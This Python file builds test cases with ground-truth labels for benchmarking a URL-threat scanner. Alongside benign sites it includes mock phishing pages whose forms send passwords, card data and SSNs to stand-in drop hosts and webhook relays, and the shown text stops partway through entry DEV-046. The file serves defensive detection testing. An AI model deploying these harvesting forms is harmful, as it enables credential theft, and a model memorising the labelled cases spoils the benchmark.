"""
Builds the 80-case development dataset and 25-case independent validation corpus
for SENTRIX scanner benchmark evaluation with deterministic offline contexts.
"""

import json
from pathlib import Path

DEV_CASES = [
    # =========================================================================
    # CATEGORY 1: BENIGN_LEGITIMATE (15 cases, GT: BENIGN)
    # High-reputation Alexa/Tranco top sites with modern security hygiene.
    # =========================================================================
    {
        "id": "DEV-001",
        "url": "https://www.google.com",
        "normalizedDomain": "google.com",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Tranco Top 1. Global search engine portal with complete HTTP security headers and standard trusted TLS.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Google Trust Services LLC"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "script-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff",
                    "referrer-policy": "strict-origin-when-cross-origin"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Google</title></head><body><h1>Google Search</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-002",
        "url": "https://en.wikipedia.org/wiki/Computer_security",
        "normalizedDomain": "wikipedia.org",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Tranco Top 10. Wikimedia educational article with full defensive headers and verified TLS.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff",
                    "referrer-policy": "no-referrer-when-downgrade"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Computer Security - Wikipedia</title></head><body><p>Encyclopedia content</p></body></html>"
            }
        }
    },
    {
        "id": "DEV-003",
        "url": "https://www.python.org",
        "normalizedDomain": "python.org",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Tranco Top 500. Official Python Software Foundation documentation portal.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Global Root CA"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=63072000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff",
                    "referrer-policy": "strict-origin"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Python.org</title></head><body><h1>Welcome to Python</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-004",
        "url": "https://github.com",
        "normalizedDomain": "github.com",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Tranco Top 100. Global software development platform homepage.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000; includeSubDomains; preload",
                    "content-security-policy": "default-src 'none'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff",
                    "referrer-policy": "origin-when-cross-origin, strict-origin-when-cross-origin"
                },
                "html_body": "<!DOCTYPE html><html><head><title>GitHub: Where the world builds software</title></head><body><h1>GitHub</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-005",
        "url": "https://www.mozilla.org",
        "normalizedDomain": "mozilla.org",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Tranco Top 200. Open-source organization homepage promoting internet health and privacy.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Internet for people, not profit — Mozilla</title></head><body><h1>Mozilla</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-006",
        "url": "https://stackoverflow.com/questions",
        "normalizedDomain": "stackoverflow.com",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Tranco Top 100. Developer Q&A knowledge base question list.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=15552000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Newest Questions - Stack Overflow</title></head><body><h1>Browse Questions</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-007",
        "url": "https://www.nytimes.com",
        "normalizedDomain": "nytimes.com",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Tranco Top 200. Major news media publisher homepage.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Amazon"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>The New York Times</title></head><body><h1>Today's Headlines</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-008",
        "url": "https://www.mit.edu",
        "normalizedDomain": "mit.edu",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Accredited educational institution (.edu) homepage.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "InCommon RSA Server CA"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Massachusetts Institute of Technology</title></head><body><h1>MIT</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-009",
        "url": "https://www.bbc.co.uk/news",
        "normalizedDomain": "bbc.co.uk",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "National public broadcaster news section.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "GlobalSign nv-sa"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>BBC News</title></head><body><h1>World News</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-010",
        "url": "https://www.apache.org",
        "normalizedDomain": "apache.org",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Open source foundation project hub.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Apache Software Foundation</title></head><body><h1>ASF</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-011",
        "url": "https://www.kernel.org",
        "normalizedDomain": "kernel.org",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Linux Kernel organization source distribution site.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=63072000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>The Linux Kernel Archives</title></head><body><h1>Kernel Releases</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-012",
        "url": "https://www.docker.com",
        "normalizedDomain": "docker.com",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Enterprise container virtualization technology homepage.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Amazon"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Docker: Accelerated Container Application Development</title></head><body><h1>Docker</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-013",
        "url": "https://www.debian.org",
        "normalizedDomain": "debian.org",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Debian GNU/Linux distribution project homepage.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Debian -- The Universal Operating System</title></head><body><h1>Debian</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-014",
        "url": "https://www.w3.org",
        "normalizedDomain": "w3.org",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "World Wide Web Consortium international standards body.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>World Wide Web Consortium (W3C)</title></head><body><h1>Standards</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-015",
        "url": "https://archive.org",
        "normalizedDomain": "archive.org",
        "category": "BENIGN_LEGITIMATE",
        "groundTruth": "BENIGN",
        "provenance": "Non-profit digital library building public web historical records.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "SAMEORIGIN",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Internet Archive: Digital Library</title></head><body><h1>Wayback Machine</h1></body></html>"
            }
        }
    },

    # =========================================================================
    # CATEGORY 2: BENIGN_LEGACY_HEADERS (10 cases, GT: BENIGN)
    # Authentic, harmless websites lacking modern defense-in-depth headers.
    # Exposes the false-positive accumulator bug audited in Phase 6 Step 1.
    # =========================================================================
    {
        "id": "DEV-016",
        "url": "https://county-library-services.org",
        "normalizedDomain": "county-library-services.org",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Small public library civic website. Clean content and valid TLS but missing modern HSTS, CSP, and XFO.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Sectigo RSA Domain Validation CA"},
            "http": {
                "status_code": 200,
                "headers": {"server": "Apache"},
                "html_body": "<!DOCTYPE html><html><head><title>County Library</title></head><body><h1>Catalog & Hours</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-017",
        "url": "https://historical-society-archives.net",
        "normalizedDomain": "historical-society-archives.net",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Local historical preservation non-profit. Older web hosting setup without CSP or HSTS headers.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "cPanel, Inc. Certification Authority"},
            "http": {
                "status_code": 200,
                "headers": {"server": "nginx"},
                "html_body": "<!DOCTYPE html><html><head><title>Historical Society</title></head><body><h1>Museum Exhibits</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-018",
        "url": "https://familydental-care-clinic.com",
        "normalizedDomain": "familydental-care-clinic.com",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Private healthcare practice brochure site. Lacks security headers but has valid certificate and zero malicious code.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><title>Family Dental</title></head><body><h1>Welcome to our Clinic</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-019",
        "url": "https://botanical-gardens-visitor.org",
        "normalizedDomain": "botanical-gardens-visitor.org",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Municipal botanical conservatory visitor information page with minimal server response headers.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "GoDaddy.com, Inc."},
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><head><title>Botanical Gardens</title></head><body><h1>Hours & Admission</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-020",
        "url": "https://community-youth-sports.org",
        "normalizedDomain": "community-youth-sports.org",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Volunteer youth soccer league schedule and field information page.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {"x-frame-options": "SAMEORIGIN"},
                "html_body": "<!DOCTYPE html><html><head><title>Youth Soccer Schedule</title></head><body><h1>Spring 2026 Season</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-021",
        "url": "https://regional-veterinary-hospital.net",
        "normalizedDomain": "regional-veterinary-hospital.net",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Animal clinic contact information and emergency phone numbers page.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Sectigo Public CA"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><title>Regional Vet Hospital</title></head><body><h1>Emergency Care</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-022",
        "url": "https://rural-electric-coop.org",
        "normalizedDomain": "rural-electric-coop.org",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Member-owned electric cooperative utility outages and rates page.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {"server": "Microsoft-IIS/10.0"},
                "html_body": "<!DOCTYPE html><html><head><title>Rural Electric</title></head><body><h1>Outage Map & Rates</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-023",
        "url": "https://downtown-bakery-cafe.com",
        "normalizedDomain": "downtown-bakery-cafe.com",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Local small business cafe menu and catering contact details.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Let's Encrypt"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><title>Bakery & Cafe</title></head><body><h1>Daily Menu</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-024",
        "url": "https://neighborhood-farmers-market.net",
        "normalizedDomain": "neighborhood-farmers-market.net",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Community weekend farmers market vendor list and location map.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "cPanel, Inc."},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><title>Farmers Market</title></head><body><h1>Vendor Directory</h1></body></html>"
            }
        }
    },
    {
        "id": "DEV-025",
        "url": "https://civic-symphony-orchestra.org",
        "normalizedDomain": "civic-symphony-orchestra.org",
        "category": "BENIGN_LEGACY_HEADERS",
        "groundTruth": "BENIGN",
        "provenance": "Non-profit civic symphony concert calendar and ticket info.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "GoDaddy.com, Inc."},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><title>Civic Symphony</title></head><body><h1>2026 Concert Series</h1></body></html>"
            }
        }
    },

    # =========================================================================
    # CATEGORY 3: BENIGN_AUTH_PORTALS (10 cases, GT: BENIGN)
    # Authentic login and authentication endpoints belonging to legitimate platforms.
    # Exposes keyword false-positive penalties (e.g. /login, /signin) on trusted domains.
    # =========================================================================
    {
        "id": "DEV-026",
        "url": "https://github.com/login",
        "normalizedDomain": "github.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official GitHub web authentication login endpoint.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Sign in to GitHub</title></head><body><form action=\"/session\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-027",
        "url": "https://accounts.google.com/signin",
        "normalizedDomain": "google.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official Google account sign-in portal on recognized Google domain.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Google Trust Services LLC"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Sign in - Google Accounts</title></head><body><form action=\"/signin/challenge\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-028",
        "url": "https://aws.amazon.com/console",
        "normalizedDomain": "amazon.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official AWS cloud management console portal.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Amazon"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>AWS Management Console</title></head><body><form action=\"/signin\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-029",
        "url": "https://login.live.com/login.srf",
        "normalizedDomain": "live.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official Microsoft identity provider sign-in page.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Microsoft Azure TLS Issuing CA"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Sign in to your Microsoft account</title></head><body><form action=\"/ppsecure/post.srf\"><input type=\"password\" name=\"passwd\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-030",
        "url": "https://www.paypal.com/signin",
        "normalizedDomain": "paypal.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official PayPal customer sign-in portal on authentic paypal.com domain.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Log in to your PayPal account</title></head><body><form action=\"/signin\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-031",
        "url": "https://appleid.apple.com/sign-in",
        "normalizedDomain": "apple.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official Apple ID management sign-in portal on authentic apple.com domain.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Apple Public EV Server RSA CA"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Sign In - Apple</title></head><body><form action=\"/auth/verify\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-032",
        "url": "https://auth.docker.com/login",
        "normalizedDomain": "docker.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official Docker ID developer authentication service.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Amazon"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Docker Login</title></head><body><form action=\"/login\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-033",
        "url": "https://id.atlassian.com/login",
        "normalizedDomain": "atlassian.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official Atlassian cloud single sign-on portal.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Log in to your Atlassian account</title></head><body><form action=\"/login\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-034",
        "url": "https://gitlab.com/users/sign_in",
        "normalizedDomain": "gitlab.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official GitLab DevSecOps platform login endpoint.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "Cloudflare Inc ECC CA-3"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Sign in · GitLab</title></head><body><form action=\"/users/sign_in\"><input type=\"password\" name=\"user[password]\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-035",
        "url": "https://store.steampowered.com/login",
        "normalizedDomain": "steampowered.com",
        "category": "BENIGN_AUTH_PORTALS",
        "groundTruth": "BENIGN",
        "provenance": "Official Valve Steam entertainment platform sign-in portal.",
        "mockContext": {
            "tls": {"status": "valid", "issuer": "DigiCert Inc"},
            "http": {
                "status_code": 200,
                "headers": {
                    "strict-transport-security": "max-age=31536000",
                    "content-security-policy": "default-src 'self'",
                    "x-frame-options": "DENY",
                    "x-content-type-options": "nosniff"
                },
                "html_body": "<!DOCTYPE html><html><head><title>Sign In - Steam</title></head><body><form action=\"/login\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },

    # =========================================================================
    # CATEGORY 4: CONFIRMED_PHISHING_CREDENTIAL_HARVESTING (12 cases, GT: MALICIOUS)
    # Active phishing kits, credential forms targeting external drops, or webhook exfil.
    # =========================================================================
    {
        "id": "DEV-036",
        "url": "http://secure-login-portal-auth.com/login.html",
        "normalizedDomain": "secure-login-portal-auth.com",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Credential harvesting page where password form explicitly posts to external drop host (data-drop.xyz).",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><form action=\"http://data-drop.xyz/save.php\" method=\"POST\"><input type=\"text\" name=\"user\"/><input type=\"password\" name=\"pass\"/><button type=\"submit\">Login</button></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-037",
        "url": "http://microsoft-online-recovery.net/office365",
        "normalizedDomain": "microsoft-online-recovery.net",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Office365 phishing kit exfiltrating harvested credentials directly to Discord webhook relay.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><h1>Office 365 Verification</h1><form action=\"https://discord.com/api/webhooks/987654/token_secret\" method=\"POST\"><input type=\"password\" name=\"password\"/><button>Verify Account</button></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-038",
        "url": "http://paypal-verification-center.org/confirm",
        "normalizedDomain": "paypal-verification-center.org",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Financial data harvesting form soliciting debit card numbers, CVV, and banking PINs.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/submit\"><input name=\"cardnumber\" placeholder=\"Card Number\"/><input name=\"cvv\" placeholder=\"Security Code\"/><input name=\"bankaccount\" placeholder=\"Bank Account Number\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-039",
        "url": "http://chase-security-check.net/verify",
        "normalizedDomain": "chase-security-check.net",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Banking impersonation harvesting SSN, card numbers, and security codes over plain HTTP.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><h2>Chase Customer Security</h2><form action=\"/record\"><input name=\"ssn\"/><input name=\"cardnumber\"/><input name=\"cvv\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-040",
        "url": "http://apple-icloud-findmy-lock.com/auth",
        "normalizedDomain": "apple-icloud-findmy-lock.com",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "FindMy activation lock bypass phishing form exfiltrating credentials to Telegram bot API.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><form action=\"https://api.telegram.org/bot123456:ABC-DEF/sendMessage\"><input type=\"password\" name=\"apple_pwd\"/><button>Unlock Device</button></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-041",
        "url": "http://netflix-billing-update-required.com/pay",
        "normalizedDomain": "netflix-billing-update-required.com",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Streaming service billing phishing form posting payment credentials to webhook.site relay.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><form action=\"https://webhook.site/3f1b4a-92c1\"><input name=\"cc-number\"/><input name=\"cvv\"/><input name=\"pan-number\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-042",
        "url": "http://bankofamerica-customer-verify.com/login",
        "normalizedDomain": "bankofamerica-customer-verify.com",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Password collection form submitting credentials to external receiver (bofa-stealer.xyz).",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><form action=\"http://bofa-stealer.xyz/action\"><input type=\"password\" name=\"password\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-043",
        "url": "http://wells-fargo-alert-update.info/portal",
        "normalizedDomain": "wells-fargo-alert-update.info",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Bank alert form soliciting account numbers, routing numbers, and SSN on unverified domain.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/save\"><input name=\"accountnumber\"/><input name=\"routingnumber\"/><input name=\"ssn\"/></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-044",
        "url": "http://malware-drop-payload-delivery.net/invoice.pdf.exe",
        "normalizedDomain": "malware-drop-payload-delivery.net",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Confirmed URLhaus active malware executable delivery point.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "application/octet-stream"},
                "html_body": "MZ binary executable header"
            },
            "reputation": {
                "urlhaus": {
                    "threat": "malware_download",
                    "tags": ["trojan", "stealer", "exe"]
                }
            }
        }
    },
    {
        "id": "DEV-045",
        "url": "http://google-drive-shared-doc-view.net/signin",
        "normalizedDomain": "google-drive-shared-doc-view.net",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Google Drive document phishing kit posting credentials to data-relay.biz external collector.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
                "html_body": "<!DOCTYPE html><html><body><form action=\"http://data-relay.biz/collector.php\"><input type=\"password\" name=\"passwd\"/><button>View Document</button></form></body></html>"
            }
        }
    },
    {
        "id": "DEV-046",
        "url": "http://facebook-security-appeal-form.com/checkpoint",
        "normalizedDomain": "facebook-security-appeal-form.com",
        "category": "CONFIRMED_PHISHING_CREDENTIAL_HARVESTING",
        "groundTruth": "MALICIOUS",
        "provenance": "Fake Facebook account suspension appeal form exfiltrating credentials to pipedream.net webhook.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {"content-type": "text/html"},
